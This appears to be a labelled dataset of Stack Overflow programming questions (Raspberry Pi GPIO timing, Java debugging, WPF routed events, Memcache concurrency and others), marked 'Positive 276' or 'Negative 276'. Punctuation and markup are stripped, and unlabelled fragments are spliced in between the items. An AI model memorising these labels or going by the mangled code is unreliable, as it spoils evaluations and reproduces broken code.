Positive 276 pI am running a piece of python code on a raspberry pi.br The function of the code is that GPIO 5 is set as a pull up resistor with a momentary switch attached. When the switch is pressed it grounds the pull up resistor. I am attempting to use the button push to trigger a callback.br The callback works like thisbr If the button is pressed and detected as still pressed it defines a variable called t1 as the current time.br If the button is detected as no longer pressed it defines a variable called t2 then subtracts t1 from t2 to find the time difference amount of time button was held down for. It then converts that value to an integer defined as variable deltaseconds.  Then it takes action based on the length the button was held for. If more than 7 seconds, reboot the raspberry pi, if more than 1 second but less than 7 it toggles output GPIO12 between high and low.  p  pThe issue I am experiencing is like thisbr The code runsbr When the button is pressed I see the print of Button 5 pressedbr When the button is released I see the print Button 5 releasedbr Then an error is display as codeUnboundLocalError local variable t1 referenced before assignmentcodebr The error is in reference to line 21 codedelta  t2t1code  p  pThe full code looks like this  p  precodeimport os import RPi.GPIO as GPIO import webiopi import time import datetime from datetime import datetime GPIO.setwarningsTrue GPIO.setmodeGPIO.BCM BUTTON5  5 GPIO.setup5, GPIO.IN, pullupdownGPIO.PUDUP GPIO.setup12,GPIO.OUT GPIO.output12,1 Just to visually distinguish between setup steps and main program def pressedBUTTON5     if GPIO.input5  False         t1  datetime.now         print Button 5 pressed     elif GPIO.input5  True         print Button 5 released         t2  datetime.now         delta  t2t1         deltaseconds  delta.totalseconds         if deltaseconds gt 7   pressed for gt 7 seconds             print Restarting System             subprocess.call[shutdown r now System halted by GPIO action amp], shellTrue         elif deltaseconds gt 1   press for gt 1 lt 7 seconds             print Toggling GPIO 12             GPIO.output12, not GPIO.input12 GPIO.addeventdetectBUTTON5, GPIO.BOTH, bouncetime200 GPIO.addeventcallbackBUTTON5, pressed try     while True         time.sleep1 except KeyboardInterrupt     GPIO.cleanup        clean up GPIO on CTRLC exit codepre

Negative 276 pAn everyday debugging situation for Java developers is that in which an Exception is thrown and then you need to dig into the debugger to find out what threw it. Usually you would try to set up some breakpoints before the exception is thrown and hope that you are able to determine the situation that leads up to that exception.p  pIn Eclipse, a breakpoint may have an expression defined where it is only triggered when, for example, variable x equals value y. My question is, is it possible to define some kind of global expression where, once an exception is thrown, it is caught by the debugger, allowing the programmer to inspect all variables immediately Ideally you would not have hit the catch block yet, Eclipse would catch the exception being raised and stop execution without changing the stack contents.p  pIs this possible or is it limited by the JVMp

Im trying to speed up the process by only doing the select once, then using a generator so I dont have to hold it all in memory.p  pstrongSolutionstrongp  pOk, so the answer to my first two questions is No.  To my third question, once a connection is made to a database, it locks the entire database, so another connection wont be able to do anything until the first connection is closed. p  pI couldnt find the source code for it, but from empirical evidence I believe that a connection can only use one cursor object at a time and the last run query takes precedence. This means that, while Im looping over the selected recordset yielding one row at a time, as soon as I run my first update statement my generator stops yielding rows.p  pMy solution is to create a temporary database that I stick the processedcontent in with the id, so that I have one connectioncursor object per database and can continue looping over the selected recordset, while inserting into the temporary database periodically.  Once I reach the end of my selected recordset I transfer the data in the temporary database back to the original.p  pIf anyone knows for sure about the connectioncursor objects, let me know in a comment.p
Negative 276 pIm really stuck here... Ive built a small gallery to display images.p  pIt consists of an initial front page with 12 thumbnails arranged in a grid. When click on a thumbnail they collapse to the left of the screen and show the appropriate gallery item. When you rollback over the collapse thumbnails they expand and hide the gallery item underneath. You can now select another thumbnail which will collapse the thumbnails again and show another gallery item.p  pIm pretty happy with everything so far except for when you click a second third, forth etc... thumbnail. It fades up the old gallery item and then switches to the new gallery item once its loaded.p  pThe way I think Ive written the script is to fade out the DIV containing the node content and then use a callback to execute the ajax .load method to load the new gallery item in as well as doing some other bits to content within this DIV. I then fade the DIV back in after the main image has loaded. It looks like the .load displays the element that its being called on as soon as it is executed.

Negative 276 pI have posted query previously and I am repeating same I want to modify igmpv3 Linux which is inbuilt in kernel2.6. such that it reads a value from a file and appropriately decides reservedres 1 value inside the igmpv3 packet which is sent by a host.p  pI want to add more to above question by saying that this is more a generic question of changing variable of kernel space from user space. p  pTo that one ctuffli has repliedp  blockquote   pFrom the perspective of a user land program, you should think of the driver as a black box with well defined interfaces instead of code with variables you want to change. Using this mental model, there are four ways i.e. interfaces to communicate control information to the driver that you should considerp      ul   liCommand line options. You can pass parameters to a kernel module which are available to it during initialization.li   liIOCTLs. This is the traditional way of passing control information to a driver, but this mechanism is a little more cumbersome to use than sysfs.li   liproc the process information pseudofile system. proc creates files in the proc directory which user land programs can read and sometimes write. In the past, this interface was appropriated to also communicate with drivers. Although proc looks similarly to sysfs, newer drivers Linux 2.6 should use sysfs instead as the intent of the proc is to report on the status of processes.    li   lisysfs is a pseudofile system used to export information about drivers and devicesli   ul      pDepending on when you need to communicate with the driver i.e. initialization, run time, you should add either a new command line option or a new sysfs entry to change how the driver treats the value of reserved fields in the packet.p blockquote  pThanks Ctuffli for your answer. I do not have any knowledge of sysfs. Can you provide more details abt it I want to change one of the reserve value of igmpv3 pkt to be either 0 or 1 or 2. This the only thing which I need to change.

Negative 276 pMy program is unable to codeFile.Movecode or codeFile.Deletecode a file because it is being used by another process, but its actually my own program that is using it. p  pI use codeDirectory.GetFilescode to initially get the file paths, and from there, I process the files by simply looking at their names and processing information that way. strongConsequently all Im doing is working with the strings themselves, rightstrong Afterwards, I try to move the files to a Handled directory.

Negative 276 pI need to parse a string like codefunc1arg1, arg2 func2arg3, arg4code. Its not a very complex parsing problem, so I would prefer to avoid resorting to flexbison or similar utilities.p  pMy first approch was to try to use POSIX C coderegcompregexeccode or Boost implementation of C codestdregexcode. I wrote the following regular expression, which does not work Ill explain why further on.p  precode   [ tn]    1 identifier     [azAZ][azAZ09]    [ tn]    2 nonmarking     [       3 nonmarking        [ t]          4..n1 argument           [azAZ09]                [ tn]        ,          [ tn]       n last argument        [azAZ09]          ]    [ tn]   codepre  pNote that the group code1code captures the identifier and groups code4..n1code are intended to capture arguments except the last, which is captured by group codencode.p  pWhen I apply this regex to, say codefuncarg1, arg2, arg3code the result I get is an array codefunc, arg2, arg3code. This is wrong because codearg1code is not in itp  pThe problem is that in the standard regex libraries, submarkings only capture the last match. In other words, if you have for instance the regex codeabcode applied on codebabbcode, the results of the inner match will be codebbcode and all previous captures will have been forgotten.p  pAnother thing that annoys me here is that in case of error there is no way to know which character was not recognized as these functions provide very little information about the state of the parser when the input is rejected.p  pSo I dont know if Im missing something here... In this case should I use codesscanfcode or similar insteadp  pNote that I prefer to use CC standard libraries and maybe boost.p
Negative 276 pGood afternoon,p  pI have been working on a dll that can use CORBA to communicate to an application that is network aware.  The code works fine if I run it as a C console application.

Negative 276 pThere are a couple of sources for random in LoadRunner scenariosp  ul licoderandcode  function li liRandom think time deltas runtime settings li liRandom pacing time components runtime settings li liRandom parameters as part of the VUGen testli ul  pI use those functionalities, and I could live with their pseudorandomness. I cannot, however, live with the fact that all scenario runs containing at least one of those functionalities behave pseudorandomly AND indeterministic, i.e. for a given start state random seed, I want two runs to generate EXACTLY the same load, including timing pacing and think times.  So I want two runs to be based on EXACTLY the same random sequences.  That means that I want to seed all random generators myself, as part of the initialization of each run.p  pI can use codesrandcode  to set a seed value for coderandcode . Setting a specific hardcoded seed value upon init always results in the same sequence delivered by coderandcode   for all virtual users. If I seed with the VUser ID number, I would even get different coderandcode  sequences for every vuser, while they still are the same from run to run for each user. p  pstrongWhat about the other pseudorandom sources in LR, those beyond coderandcode   Do I have a chance to seed them all so I get deterministic scenario behaviorstrongp  pI think that would greatly help. p  pWithout a mechanism like that, one has to plan for very long, andor very hightraffic test scenarios in order to average out the randomness in the results statistics do you agree with this which I do all day.p

Ive got it to the point where it does indeed poll the page on a specific interval, and that interval is specified in a SharedPreference which can be changed by the user in the settings page of the app. But complications arise when network connectivity is flaky.p  pFor example, how do I ensure that the Service wakes up the network adapter and gives it ample time to connect before polling the page, in the case that the phone was sleeping to save power This polling action can happen as little as once every 24 hours, so I dont want to miss one action just because the network was out but turned on a few seconds, minutes, or even hours later.p  pOr there are times when the web service doesnt respond, or DNS doesnt respond, or what have you, and for any reason it doesnt get a response even though the phone is technically connected. What sort of rule do I put in place to make this retry later, so that Im not retrying repeatedly when the user specifically turned off their internet but Im retrying soon enough that if it was just a hiccup, the data can be received soon after the first tryp  pAre there any examples for this type of situation What is the logic to best handle thisp

Negative 276 pFacebook has cooked into their search some features that are unique  possibly some are patented, even The features I speak of are driven by three distinct requirementsp  ol liThe fact that their database is gigantic, and they cant just JOIN their way over to the data they need as they need it, as you can, typically in a singlehomed business app with less than a million records.li liThe expectations of their users are shaped by other search experiences, namely Google, so that longtail search queries are done by appending keywords to the persons name being searched for, such as Orlando, Florida or Rotary Club or some other identifying value like an employer name.li liThe data architecture appears to be shallow, based on the window we have on it looking in from the application of course its not shallow. What Im saying is that beyond the socalled Basic Information in a user profile, such as gender, and current city, so much of what makes a profile unique is not rigidly assigned to logical columns.li ol  pSo, then, complexity exists in the needs associated with the size of the dataset, BUT with it a need to deliver to the user relevant results, to a user community thats not savvy in search, but has had their expectations and training provided by The Google.p  pGiven all of that a refinement of my questionp  pa. strongWhat search features are necessary for FaceBook that we should take note of and deploy in our own search appsenginesstrong By necessary, I mean driven by either the massive size of the data set, or driven by the expectations of the users, and the need for the site to organically grow and increase its relationships among its data  I mean, users.p  pb. strongWhat search features are innovative and worthy of attention by data andor search architectsstrongp  pSome are obvious, such as using synonyms for first names  fuzzy matching a query for Bill with a William record. You can do this in Solr with a list of synonyms. Id call this a basic feature that is necessary, not innovative of course.p  pOthers, which emareem innovative deserve our attention. The first example of innovation that I can call attention to is that their search relevancy is custom per user. If I type John Smith I get a different set of results than another searcher would theoretically better matches for me, people in my network, friends of friends, etc.. Before you say thats not innovative because you can type just Pizza in Google and theyll give you relevant results by appending your locale to the query, follow along, please. My hope is that answers and discussions, really, to this question would frame in some of the technical requirements as well as provide ideas to include as features in search.p  pFor instance...p  ul liWould you guess they run a regular batch process to denormalize the data i.e. a batch job to make a link table of inplace first degree of separation, second degree, etc.li liFrom such a batch or denormalization, does it then limit the number of hits This is evidenced by returning only the logically nearest John Smith matches. However, searches of noncommon names [such as my own first and lastname] seem not affected by a limit on results and the search will look around the world, completely outside of those few degrees of separation.li liAre they increasing the relevance scoring by age, giving more relevancy to matches that are near the same age group as the searcher comment it seems they should, it could be at least a minor speed  bump to intergenerational communicationsmeetings that should not happen  euphemistic, I knowli ul  pTechnically, on the back end, is it best to do a denormalization process at the database level and THEN index the documents clarification for those unitiated to enterprise search a document is MOL similar in concept to a database record... MOLp  pOR, is there no database denormalization. In place of that, the process of writing the search index includes writing into each document the related information and the people who are innetwork or just a few degrees apartp  pCERTAINLY its necessary to preprocess such info. Without having done this exact thing in practice, myself, it seems to me that its advantageous to denormalize in batches at the database level, reason being that the search server is good at finding info super fast, but the database server is better at getting the matching data assuming it extends out to related columns which are not in the search index.p  pConsequently, expanding upon the concept of search relevancy being dependent upon the usersearcher, notice that it is also derivative of the recent browsing activity of the user. For example, a search for John Smith Orlando might never produce the right John Smith, but after visiting the correct John Smiths FaceBook page suppose you got his URL in an email, emeven without adding John Smith as a friend, a subsequent search on John Smith will, this time, actually return that result the very next time.em [I wonder how long before that ages out, or if it ages out at all]p  pI used Facebook as an example here because theyre huge. Their size forces a wellthought architecture  such as what stays in its normal form, and what cannot because you just cant codeJOINcode a 100 million record table repeatedly rejoining the same person table from another fork off of a link table or a a hrefhttpstackoverflow.comquestions2768040whataretheadvantagesofaqueryusingaderivedtablesoveraquerynotusinderived tablea can produce the friends of friends effect.p  pThe practice of relevancy tuning is really almost an art. Data sets, business rules, and users expectations are unique enough that a multipurpose scoring template, or even a best practices is nearly impossible to create.p  pThat being said, by looking to the big sites who are pulling off search well enough, there is a technique to emulate, isnt therep  pWhat are those techniques in place at FaceBook And given their size, they cant just fetch what the user needs when they need it via ORM not a slam to ORM champions  this requires wellplanned normalization, SQLlevel indexing, DEnormalization, and search server indexing.p  pCan anyone suggest what are some of the techniques in place there For that matter, any large site with a similar search and a large data set will also provide good, ontopic suggestions.p

Negative 276 pIve written a task manager program using Java, and made a single UI implementation for the moment in swing. The program has 3 layers at the moment. A presentation layer that interacts with the domain layer via a use case controller, and finally a technical services layer used for persistence. There are several actions a user can take at this point, such as adding tasks, editing the status of a task, etc... The purpose of my logger in this scheme is to keep track of all actions taken by the users. So, there are a few places where I could invoke the logger to write a command. I will not be doing any logging in the presentation layer as this would be a terrible design decision and so Im left with the controller, the command interface implemented to handle the execution of all commands for the purpose of implementing undoredo functions, or in the lower level classes that are actually being manipulated, say the task class for instance.p  pI think the controller is a relatively decent option for this as it acts as the point of contact between the UI layer and the domain, thus all notable commands ultimately pass through the controller making it easy to verify that all of the important methods are being logged. A reason not to do it in the controller is that it will reduce the cohesion, increase coupling and potentially lead to a bloated controller.p  pThe concrete commands are another potential location as they too have all of the information needed for logging. This would again cause the commands to become less cohesive and increases the coupling. Also, if I dont use the command interface for taking an action on a domain object than I lose my logging.p  pFinally this leads me to implementing the logger in the lower level domain objects methods. This is a good candidate because logging will always occur if the program is being used and all of the information needed is available. The only negative part is that logger commands will be sparsely scattered amongst the lower level domain objects making it harder to ensure that all of the right methods are being logged.p  pI would love get a debate going about this type of decision and appreciate all of your comments.p

My list item layout looks like thisp  precodeltxml version1.0 encodingUTF8gt ltLinearLayout xmlnsandroidhttpschemas.android.comapkresandroid     androidorientationhorizontal     androidlayoutwidthfillparent     androidlayoutheightfillparentgt     ltImageView androidididzoneIcon         androidlayoutwidthwrapcontent         androidlayoutheightfillparent         androidpaddingLeft5dpgt     ltImageViewgt     ltTextView          androidididitemtitle         androidlayoutwidthfillparent         androidtextColorcolorlistItemColor          androidtextSize14sp          androidlayoutgravitytopleft          androidlayoutheightfillparent          androidpadding13dp          androidtextStyleboldgt     ltTextViewgt ltLinearLayoutgt codepre  pI thought that setting the layoutwidth of the text view to codefillparentcode would cause the text view to fill the remainder of the items width, and that the whole row should highlight. Is there something else I need to set to control the width of the overall item What am I doing wrongp  pEdit I also have another problem which may be related When I scroll the list which normally has a white background, the area occupied by the list items turns black during the scrolling, and then appears normal again when scrolling stops. The black area is the same size as the area that would be highlighted except that its all the items rather than just one, which is to say that there are white spaces on the right side of some of the items while scrolling. Id like to prevent the list from turning black while scrolling, but perhaps thats another question. I mention it because it makes me think that some list items arent filling their parent, but Im still not sure why.p

It shows an invisible line at 25 of cpu resource usage for the installation program, and even when the proc has nothing else to do, this percentage doesnt grow.

Negative 276 pIs there a way to tell Hibernate that java.util.Date should be persisted as long I need this to get around the missing millisecond resolution in MySQL.p  pCould you think of any drawbacks of this approachp
Negative 276 pIm simplifying this a bit but we have a User table and a TestResult table in a large existing sql2008 database used by a large mature .net project.  The users are given many tests and these are accessed a lot so to speed things up the User table contains a CurrentTestResult and a PendingTestResult for the last test and a test in progress respectively.  Also you cant just look at the date to find the the current test as sometimes a test may be invalidated, same with pending.p  pTestResult of course, contains a foreign key for UserID and User has 2 foreign keys pointing to TestResult.  Its been this way a long time, without too much problem.  Occasionally somehow a test gets pinned to a user even though its not their test, so clearly its not perfect, and I need to track down the hole anyway.p  pWe are moving to a disconnected model and they are telling me we must remove all circular keys.  They dont want to temporarily drop and readd the keys because they wont know what to do if that process fails.  Not being familiar with the process Im not sure if that makes sense, but thats a question for later after I figure out the cons of me fixing the references.p  pI can see several solutions to this problem for me, all of which have their drawbacks. p  pA The simplest of which is just dropping the 2 foreign keys.  I dont have a huge problem with this because the FK constraint is only half the picture, unless its linked to the right user its still invalid.  I have to weigh the risk vs code changes for keeping the keys.p  pB I could add a crossreference table to hold the link to current and pending. I think this will give me basically the same protection I have now, with only slight performance difference.  I think the circular key problem goes away because they can insert the xref last.  I will have a ton of code changes.p  pC I could add 2 columns to TestResults and flag the current and pending records.  The problem here is now I have to make sure only 1 flag is set per user and I now have to do an index look up every time I access my data.  So Ive lost on protection, performance and I still have a ton of code changes.p  pDp  pIm sure this is a fairly common pattern, is there a correct solutionp

Negative 276 pSo I am working on a project where a client discovered a problem on a site a previous developer built for them. They found that the Scribd iPaper module loads up secure documents fine in Firefox, Safari, and Chrome but not in Internet Explorer.p  pIn IE the darn thing just doesnt load. The site is using the Drupal iPaper module which was funded by Scribd I believe. It is using the Flash reader for secure documents. I would switch it over to using the newer HTML5 reader, however they need the document to be secured and the HTML5 reader does not offer a feature for that.p  pI have dug around on the Internet for answers and found nothing of use. I suspected a possible CSS or JS related issue we all know how obnoxious IE can be, but when I removed all of both from the page the results stayed the same.p  pI then tried to find an alternative solution and found Embedit.in. Made a PHP Library and a Drupal module and then as of Monday of this week their service started going on the fritz no longer converting uploaded files, they claim server problems. I looked into docstoc, but in order to use their API you have to email them since they disabled the request form due to spam problems. I have emailed them but with no reply. I even offered to share a PHP library and Drupal module that I will make and maintain myself with them and the world which is what I intended to do with Embedit.in too.p  pI also looked into the option of using an embed code to directly load a PDF in the browser. Works great in everything except Firefox has problems getting the right plugin and doesnt default to the Adobe Flash plugin like all the other browsers.p  pI have also tried compiling PDF2SWF on my Mac with no luck. I am not even sure if I could use that on the servers and I dont have SSH access to the prod server anyway Subversion deployment only.p  pI am getting to the end of my ropes here.

Negative 276 pI work on registration sites as part of my job and patterns appear that I try and farm out to a central codeBasePagecode DLL. Here I have created useful and reusable methods in the past, Such as methods to help sending emails and Dependency Injection setups for Ninject.p  pIt might be useful to note that codeBasePagecode is a reference that I add to a website.p  pIn this case, I wanted the session to expire, so that when someone uses the browser back event a delegate cannot resubmit their information.p  pThe code I use isp  precode         Stop Caching in IE         Response.Cache.SetCacheabilitySystem.Web.HttpCacheability.NoCache           Stop Caching in Firefox         Response.Cache.SetNoStore codepre  pIt works, so I thought that it would be useful to have a method in my codeBasePagecode class that I could call to Disable the cache, and reduce the call to do this in the page to one line.p  pThe problem is, I think this is partly to do with the fact codeBasePagecode is a referenced DLL, if I use the method call from my codeBasePagecode dll the cache is not disabled.p  pDoes anyone know if there is a way I can use a call this method from my codeBasePagecode dll to disable the cache on a page, or do I have to keep it local to the websitep  pstrongUPDATE 0707strongp  pHave found something interesting.p  pSeveral sites suggest using a session variable to determine if someone is returning to the page. if they are you then fire off to a halt page.p  pYou need the codenoCachecode so that the page refires the codePageLoadcode event p  pBut I have also found I have a page that contains the above mentioned code, but I have a custom validation that has to hit the server to validate and returns a validation error. On correcting, so that the value is valid, then submitting again. Pressing back says the page has expired.p  pSo if I change all the validation so that codeEnableClientScriptcode is false any error will cause the webserver to time out on a back button event once it has been successfully submitted.p  pThis doesnt fix it completely, but it will stop people pressing back in a specific case of them entering an invalid value.p  pCheersp  pLukep
Negative 276 pThe question is that after all my research I still cant find the difference between a regular routed event and a attached event. What is the functional the difference or do others agree that there is nonep  h1Implementationh1  pThe ButtonBase class declares a routed event named ClickEvent a normal routed event.p  precodepublic static readonly RoutedEvent ClickEvent  EventManager.RegisterRoutedEventClick, RoutingStrategy.Bubble, typeofRoutedEventHandler, typeofButtonBase  [CategoryBehavior] public event RoutedEventHandler Click      add              base.AddHandlerClickEvent, value          remove              base.RemoveHandlerClickEvent, value       codepre  pThe Mouse class declares a routed event named MouseDownEvent an attached event.p  precodepublic static readonly RoutedEvent MouseDownEvent  EventManager.RegisterRoutedEventMouseDown, RoutingStrategy.Bubble, typeofMouseButtonEventHandler, typeofMouse  public static void AddMouseDownHandlerDependencyObject element, MouseButtonEventHandler handler      UIElement.AddHandlerelement, MouseDownEvent, handler   public static void RemoveMouseDownHandlerDependencyObject element, MouseButtonEventHandler handler      UIElement.RemoveHandlerelement, MouseDownEvent, handler  codepre  pBoth events are registered with EventManager and stored as a public, static, readonly, fields in the same manner. ClickEvent has a backing CLR event field with custom add and remove accessors that call base.AddHandler and base.RemoveHandler respectively both of which are declared in the UIElement base class that ButtonBase derives from. MouseDownEvent instead has two static methods AddMouseDownHandler and RemoveMouseDownHandler, that ultimately call the same two AddHandler and RemoveHandler methods declared in UIElement just like ClickEvent.p  pThe AddHandler and RemoveHandler static methods for actual attached events declared on a static class must follow a specific naming convention to allow the WPF event system to use reflection to find the appropriate add and remove handlers at runtime.p  phrp  h1Usageh1  pBoth events can have handlers attached in XAML as followsp  precodeltGrid Button.ClickGridClick       Mouse.MouseDownGridMouseDowngt ltGridgt codepre  pBoth events can be attached in code as followsp  precode Attach ClickEvent handler. myGrid.AddHandlerButton.ClickEvent, new RoutedEventHandlerGridClick   Attach MouseDownEvent handler. Mouse.AddMouseDownHandlermyGrid, GridMouseDown codepre  pAs you can see both events can be attached to elements that do not own or declare them.p  phrp  h1Conclusion  What is an Attached Eventh1  pMSDN documentation states a hrefhttpmsdn.microsoft.comenuslibrarybb613550.aspxhttpmsdn.microsoft.comenuslibrarybb613550.aspxap  blockquote   pExtensible Application Markup Language   XAML defines a language component   and type of event called an attached   event. The concept of an attached   event enables you to add a handler for   a particular event to an arbitrary   element rather than to an element that   actually defines or inherits the   event. In this case, neither the   object potentially raising the event   nor the destination handling instance   defines or otherwise owns the event.p blockquote  pIn addition, the official MCTS Training Kit for Exam 70511  Windows Applications Development with Microsoft .NET Framework 4 statesp  blockquote   pIt is possible for a control to define   a handler for an event that the   control cannot itself raise. These   incidents are called attached events.   For example, consider Button controls   in a grid. The Button class defines a   Click event, but the Grid class does   not. However, you can still define a   handler for buttons in the grid by   attaching the Click event of the   Button control in the XAML code.p blockquote  pThe term attached event seems to be blurred throughout Microsoft learning resources, although it is clear there are two different, but very closely related concepts at play here attached events and XAML attached event syntax. Both Microsoft sources Ive quoted seem to be referring to XAML attached event syntax, rather than actual attached events. However, the attached events overview MSDN page does go on to show you how to implement an actual attached event, where as the training kit does not.p  pMouse.MouseDownEvent is an example of a routed event declared on a static class with corresponding static add and remove handlers, otherwise known as an attached event. However, ButtonBase.ClickEvent is a normal routed event, although it can still be used with XAML attached event syntax in the same manner as an actual attached event.p  pThe purpose of an actual attached event is that it allows developers to declare new routed events for existing UIElementderived classes without having to subclass them meaning you can just attach new routed events without them actually existing on the classes you want to raise or handle them on. But, wait a minute... isnt that the primary purpose of a pure routed event in the first placep  pThe routed events overview page on MSDN states a hrefhttpmsdn.microsoft.comenuslibraryms742806.aspxhttpmsdn.microsoft.comenuslibraryms742806.aspxap  blockquote   pFunctional definition A routed event   is a type of event that can invoke   handlers on multiple listeners in an   element tree, rather than just on the   object that raised the event.p blockquote  pFrom that functional definition it seems that any routed event essentially provides the same exact functionality as an attached event. So basically an attached event is really just a means to declare a routed event on a static class and doesnt really offer any benefit over normal routed events.p  pLet me know you think, as I may be missing something here.p  pThanks, Tim Valentinep

Negative 276 pIs there any easy way  library  external app to introduce Unit of Work concept to Django ORM What approaches or techniques do you use to solve the problem of importing the same row twice in a complicated model setup without loosing all the modularityp  pstrongEDITstrongp  pemExampleemp  pConsider the following emexamplatoryem situation  there is a model codeLocationcode which has a relationship with itself called route through an additional model codeRoutecode. Now lets say each codeRoutecode has attributes called codeentryfarecode the amount of money you need to pay to enter the route and codeexitfarecode the amount of money you need to pay to exit the route on its other end. Now lets say you want to implement an action of augmenting the codeentryfarescode and augmenting codeexitfarescode. You also want to be able calculate the total sum of fares for a given city. You may want to perform a series of such actions inside a single transaction. Reads comuting the sum are much more frequent than writes augmenting the fares.p  pIn a naive implementation you would need to load a fresh set of models each time you want to calculate the sum  to ensure there is no stale data. Also augmenting would operate on a new set of models each time and would save instances immediately after the fare is augmented to ensure that further fetches from the database include the new fare values.p  pRemember, this is meant to serve as an example.p

Shift and control modify the currently selected tool options, and alt operates the camera  much like any other 3D CAD app.p  pHowever Im currently developing with a Gnome desktop, and its window manager AFAIK catches any AltRightButton mouse dragging events and interprets them as a window drag command  even when not holding the title bar and regardless of the currently highlighted widget.p  pThis is a disaster for me because camera keyboard controls are quite standardised in my target industry.

Negative 276 pSo, I am drawing a graphic in a codeJPanelcode object using codeGrahics2Dcode.br The codeJPanelcode is placed in a codeJScrollPanecode for the cases when my graphic is bigger than the window.br But after I draw my graphic the codeJPanelcodes size does not change and I cannot scroll to see the rest of my graphic, so I locate the lowest and most left points and set the size manually in the method that does the drawing method is called codedrawTrackcode.br When I switch windows or do something else that makes the JPanel to be drawn again, my graphic disappears, so I rewrote codepaintcode, coderepaintcode, codevalidatecode, codeinvalidatecode methods and in there I invoke the codedrawTrackcode method to draw my graphic on every possible case of redrawing the JPanel.br The problem is that when the codeJPanelcode invokes one of the methods that do the redrawing I invoke codedrawTrackcode in them, which after redrawing my graphic sets the size manually so that I can scroll the codeJScrollPanecode and see my whole graphic. But when I invoke codesetSizecode method on the JPanel that makes it to be redrawn again, which means to invoke codedrawTrackcode and so on and so on.br The scroll bars appear because the size is correct but it creates an infinite loop that redraws my graphic over and over. And if I dont invoke the codesetSizecode method my codeJPanelcode gets default size so it can fit in the codeJScrollPanecodes viewport and thus I cannot scroll it to see my graphic.br Any suggestionsp
Negative 276 pHi friends of StackOverflow, I do not understand how to roll back I read the documentation of Spring, but I still do not understand. Basically Im going to persist an object in the db with primary key manually all the way here all right, the object is inserted into the db.

Is it possible to change the target framework for the RS builtin web server Not sure why a builtin web server is used in place of IIS. Is it possible to use IIS insteadp

Negative 276 pMy friend and I are developing an app for the Mac app store. We submitted it to the app store but Apple rejected it on the basis of a bug wed never experienced before ourselves. We had a hard time reproducing the error, but after quite some time debugging we found out that the bug only appears in an archived product.p  pThe symptom of the bug is that some of the buttons in our app suddenly stop responding after using the app for a random amount of time. The only time we see this problem is in an archived app, so trying to find out what causes the problem is difficult.p  pWhat is actually happening when we archive our app How does it differ from a build running directly in Xcode Have anyone of you experienced a similar problemp

Negative 276 pI need to move a small 2D array of values around a much larger 2D array of values, and set any values of the larger array that are greater than the corresponding values in the smaller array to the values of the smaller array. Think image compositing, sort of, but using two 2D arrays of floats. I need to do this a ton of times as fast as possible. Just wondering if there is some way to optimize using NEON Assembly, the Accelerate framework or some other method I havent heard of. Is anything going to be much faster than a double nested for loop to compare and replace values For example, would it possibly be faster to store the values as a 1D array instead of a 2D array Or faster to access the values across rows rather than down each column Just trying to squeeze out any extra speed I can get, but not sure how.p

Negative 276 pIm working with codeSOAPWSDLcode and another companys custom WSDL file. Every time they make a change for me and I recreate my modules, something breaks. Finding the problem is rather tedious because I dont find a proper way to access the actual request that is sent to the SOAP server.p  pThe only way to get to the request so far has been to use tcpdump in conjunction with wireshark to extract the request and result. That works, but since I dont have root privileges on the dev machine I have to get an admin over every time I want to do that.

Negative 276 pIm developing a standalone XULRunner application, in which its important to give a user feedback on what is happening when a page is loading. My first implementation was guided by the a hrefhttpsdeveloper.mozilla.orgenCodesnippetsOnpageload relnofollowMDN tutoriala. However, this could only work with pages that I open from my code. I had no way of giving a user feedback for links in the body of a document. Further search landed me at a hrefhttpforums.mozillazine.orgviewtopic.phpt607425 relnofollowa forum threada. Following what this guy did, I could listen to page loading events including state changes, progress changes, and URL location changes. I can now tell when a page starts to load so that I can display the progress bar. I can also tell when the page is fully loaded so that I can hide the progress bar.

Negative 276 pIm hoping someone on this forum can help me with a custom avatar upload page Im trying to create for Buddypress. Apologies in advance for the long email, but I want to be as clear as possible so I can hopefully get a clear and specific answer p  pThe page is part of a three step getting started process the user completes after registering for the website 1. filling out profile fields 2. uploading avatar 3. inviting friends. p  pIm no expert with code, but I have got step 1 and 3 sorted by copying and editing the code from the profileedit.php and inviteanyonebyemailbyemail.php files respectively, and then doing a redirect onsubmit to the next step. p  pTo get step 1 to work I also had to edit the bpxprofiletemplate.php file to include an if ispage ... else ... so that the page would use loggedinuser rather than displayeduser. p  pWith step 2 I have the page appearing correctly, but after I choose an image for the avatar and hit upload the page refreshes and does not go to the crop, which is what it would do if you were uploading an avatar on the changeavatar page within the profile. p  pIf I change the form action to redirect to the changeavatar page within the logged in user profile by default there is no action, then the crop appears, but I dont want to have the user leave the steps. p  pI thought maybe I needed to change something in the set of avataradmin functions in bpcoretemplate.php so that it will work on other pages, but this is no beyond my abilities. I really hope someone can help with this because it is the final hurdle for completing this process. p  pBelow is the code for the changeavatar.php and this is what Ive copied and am trying to make work on a custom page.

Negative 276 pI am using Google App Engine with the Python 2.7 run time. I know it is multithreaded, but the multiinstance nature of Google App Engine makes this question relevant to any run time.p  pI have a web messenger application. It is based on the Channel API for receiving various notifications message received, user connected, user typed and on the Memcache API for maintaining global state and on the High Replication Datastore for actually storing the message history. The time stamp of the last message is kept in Memcache along with other data, such whether the user is online or not, typing or not and others. Whenever a user sends a message, the Memcache is updated with the new time stamp value, while the old time stamp value is sent using the Channel API. When multiple messages are sent at the same time, the Memcache is sometimes overwritten and I get weird values for that time stamp. For example  One message has a certain time stamp and the strongemnextemstrong has an strongemolderemstrong time stamp.p  pI know about the Memcache Client API, but I cannot use that because I must read the most up to date time stamp first and the write the new time stamp.p  pIn short, I want to somehow wait for the Memcache data to be completely unoccupied read or write, lock it somehow, proceed throughout the entire request and then release it for the next request.p  pAny suggestionsp  pThank you in advance. p

